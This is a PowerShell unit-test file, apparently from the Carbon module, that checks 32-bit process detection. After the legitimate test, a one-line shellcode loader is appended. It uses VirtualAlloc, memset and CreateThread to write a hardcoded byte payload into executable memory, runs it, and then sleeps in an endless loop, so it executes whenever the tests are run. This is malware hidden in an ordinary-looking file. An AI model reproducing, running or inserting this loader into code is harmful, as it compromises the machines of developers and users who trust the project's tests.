











function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
}

function Test-ShouldDetect32BitProcess
{
    $expectedResult = ( $env:PROCESSOR_ARCHITECTURE -eq 'x86' )
    Assert-Equal $expectedResult (Test-PowerShellIs32Bit)
}


$Jzdp = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Jzdp -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x04,0xc6,0x72,0x5c,0xd9,0xcf,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x53,0x0f,0x03,0x53,0x0b,0x24,0x87,0xa0,0xfb,0x2a,0x68,0x59,0xfb,0x4a,0xe0,0xbc,0xca,0x4a,0x96,0xb5,0x7c,0x7b,0xdc,0x98,0x70,0xf0,0xb0,0x08,0x03,0x74,0x1d,0x3e,0xa4,0x33,0x7b,0x71,0x35,0x6f,0xbf,0x10,0xb5,0x72,0xec,0xf2,0x84,0xbc,0xe1,0xf3,0xc1,0xa1,0x08,0xa1,0x9a,0xae,0xbf,0x56,0xaf,0xfb,0x03,0xdc,0xe3,0xea,0x03,0x01,0xb3,0x0d,0x25,0x94,0xc8,0x57,0xe5,0x16,0x1d,0xec,0xac,0x00,0x42,0xc9,0x67,0xba,0xb0,0xa5,0x79,0x6a,0x89,0x46,0xd5,0x53,0x26,0xb5,0x27,0x93,0x80,0x26,0x52,0xed,0xf3,0xdb,0x65,0x2a,0x8e,0x07,0xe3,0xa9,0x28,0xc3,0x53,0x16,0xc9,0x00,0x05,0xdd,0xc5,0xed,0x41,0xb9,0xc9,0xf0,0x86,0xb1,0xf5,0x79,0x29,0x16,0x7c,0x39,0x0e,0xb2,0x25,0x99,0x2f,0xe3,0x83,0x4c,0x4f,0xf3,0x6c,0x30,0xf5,0x7f,0x80,0x25,0x84,0xdd,0xcc,0x8a,0xa5,0xdd,0x0c,0x85,0xbe,0xae,0x3e,0x0a,0x15,0x39,0x72,0xc3,0xb3,0xbe,0x75,0xfe,0x04,0x50,0x88,0x01,0x75,0x78,0x4e,0x55,0x25,0x12,0x67,0xd6,0xae,0xe2,0x88,0x03,0x5a,0xe6,0x1e,0x6c,0x33,0xe8,0xd1,0x04,0x46,0xe9,0xfc,0x88,0xcf,0x0f,0xae,0x60,0x80,0x9f,0x0e,0xd1,0x60,0x70,0xe6,0x3b,0x6f,0xaf,0x16,0x44,0xa5,0xd8,0xbc,0xab,0x10,0xb0,0x28,0x55,0x39,0x4a,0xc9,0x9a,0x97,0x36,0xc9,0x11,0x14,0xc6,0x87,0xd1,0x51,0xd4,0x7f,0x12,0x2c,0x86,0x29,0x2d,0x9a,0xad,0xd5,0xbb,0x21,0x64,0x82,0x53,0x28,0x51,0xe4,0xfb,0xd3,0xb4,0x7f,0x35,0x46,0x77,0x17,0x3a,0x86,0x77,0xe7,0x6c,0xcc,0x77,0x8f,0xc8,0xb4,0x2b,0xaa,0x16,0x61,0x58,0x67,0x83,0x8a,0x09,0xd4,0x04,0xe3,0xb7,0x03,0x62,0xac,0x48,0x66,0x72,0x90,0x9e,0x4e,0x00,0xf8,0x22;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$YJo3=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($YJo3.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$YJo3,0,0,0);for (;;){Start-sleep 60};

